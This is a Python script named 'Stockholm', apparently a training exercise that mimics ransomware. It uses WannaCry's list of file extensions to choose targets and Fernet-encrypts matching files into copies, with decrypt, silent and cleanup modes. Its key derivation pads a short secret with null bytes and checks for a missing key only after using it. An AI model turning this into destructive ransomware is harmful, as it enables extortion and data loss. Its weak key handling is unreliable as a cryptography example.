import argparse
import base64
import os
from dotenv	import load_dotenv
from cryptography.fernet import Fernet

wannacry_extensions = [
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx",
    ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".jpeg", ".jpg", 
    ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", 
    ".xltm", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", 
    ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", 
    ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".bmp", 
    ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", 
    ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", 
    ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", 
    ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", 
    ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", 
    ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", 
    ".sldx", ".ppsm", ".ppsx", ".ppam", ".docm", ".xlm", ".xlsm", ".pptm", ".potm", ".ppsm", ".ppam", 
    ".sldm", ".sldx", ".xlsb", ".xltx", ".xltm", ".xlsx", ".dotm", ".dotx", ".docx", ".doc", ".txt", 
    ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".jpg", ".png", ".csv", ".sql", ".mdb", 
    ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".java", ".jpeg", ".gif", ".cpp", ".cs", 
    ".h", ".pl", ".bmp", ".max", ".swf", ".fla", ".htm", ".swf", ".dll", ".php", ".exe", ".asp", 
    ".js", ".jar", ".vbs", ".cmd", ".scr", ".crt", ".cer", ".key", ".pem", ".odp", ".otp", ".sxi", 
    ".stc", ".std", ".sxd", ".pot", ".pps", ".otp", ".odg", ".otg", ".sti", ".sxi", ".sxm", ".sxw", 
    ".sxg", ".stw", ".stc", ".ots", ".ods", ".odt"
]

class Stockholm:
	def __init__(self, silent: bool = False):
		self.silent = silent
		self.secret_key = os.getenv('SECRET_KEY')
		self.key_base64 = base64.urlsafe_b64encode(self.secret_key.encode().ljust(32, b'\0'))
		if not self.secret_key or not self.key_base64:
			exit('No secret key found in .env file')
		
		self.key = self.key_base64
		self.fernet = Fernet(self.key)
		

	def encrypt(self):
		if not os.path.exists('./encrypted'):
			os.makedirs('./encrypted')
		
		path = os.getenv("BASE_PATH")

		for file in os.listdir(path):
			if file.endswith(tuple(wannacry_extensions)):
				noext = os.path.splitext(file)[0]
				with open(f'./{path}/{file}', 'rb') as f:
					data = f.read()
					encrypted = self.fernet.encrypt(data)
					with open(f'./encrypted/{noext}.ft', 'wb') as e:
						e.write(encrypted)
						if not self.silent:
							print(f'{file} encrypted')


	def decrypt(self):
		if not os.path.exists('./decrypted'):
			os.makedirs('./decrypted')
		
		path = os.getenv("BASE_PATH")

		for file in os.listdir("./encrypted"):
			if file.endswith('.ft'):
				noext = os.path.splitext(file)[0]
				with open(f'./encrypted/{file}', 'rb') as f:
					data = f.read()
					decrypted = self.fernet.decrypt(data)
					with open(f'./decrypted/{noext}.decrypted', 'wb') as e:
						e.write(decrypted)
						if not self.silent:
							print(f'{file} decrypted')

def cleanizer():
	if os.path.exists('./encrypted'):
		for file in os.listdir('./encrypted'):
			os.remove(f'./encrypted/{file}')
		os.rmdir('./encrypted')
	
	if os.path.exists('./decrypted'):
		for file in os.listdir('./decrypted'):
			os.remove(f'./decrypted/{file}')
		os.rmdir('./decrypted')

	exit('Cleaned up the encrypted and decrypted files')

def main():
	load_dotenv()
	parser = argparse.ArgumentParser(description='Encrypt and decrypt files')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0', help='Show program\'s version number and exit')
	parser.add_argument('-r', '--reverse', action='store_true', help='Reverse the encryption/decryption process')
	parser.add_argument('-s', '--silent', action='store_true', help='Silent mode', default=False)
	parser.add_argument('-c', '--clean', action='store_true', help='Clean up the encrypted and decrypted files', default=False)

	args = parser.parse_args()

	if args.clean:
		cleanizer()

	stockholm = Stockholm(args.silent)
	if args.reverse:
		stockholm.decrypt()
	else:
		stockholm.encrypt()


if __name__ == '__main__':
	main()